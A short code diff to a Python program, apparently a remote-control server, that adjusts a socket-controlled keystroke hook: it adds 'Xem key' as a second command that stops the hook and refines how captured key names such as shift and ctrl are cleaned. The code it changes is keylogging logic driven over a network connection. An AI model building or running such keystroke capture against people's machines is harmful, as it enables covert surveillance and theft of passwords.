@@ -70,6 +70,8 @@ def Server_Running():
             return 1
         except:
             return 0
+
+            
     def hook():
         from threading import Thread
         import threading
@@ -86,8 +88,7 @@ def Server_Running():
                     while True:                       
                         check = client.recv(1024).decode("utf8")
                         print(check)
-                        if check == "Unhook Key":  
-                                                 
+                        if check == "Unhook Key" or check =="Xem key":                 
                             KeyStop = False
                             break
                 finally:
@@ -143,7 +144,8 @@ def Server_Running():
                     k = str(k).replace("esc","ESC")
                     k = str(k).replace("num_lock","")
                     k = str(k).replace("caps_lock","")
-                    k = str(k).replace("shift","")
+                    k = str(k).replace("shift_l","")
+                    k = str(k).replace("shift_r","")
                     k = str(k).replace("ctrl_l","")
                     k = str(k).replace("ctrl_r","")
                     k = str(k).replace("alt_l","")
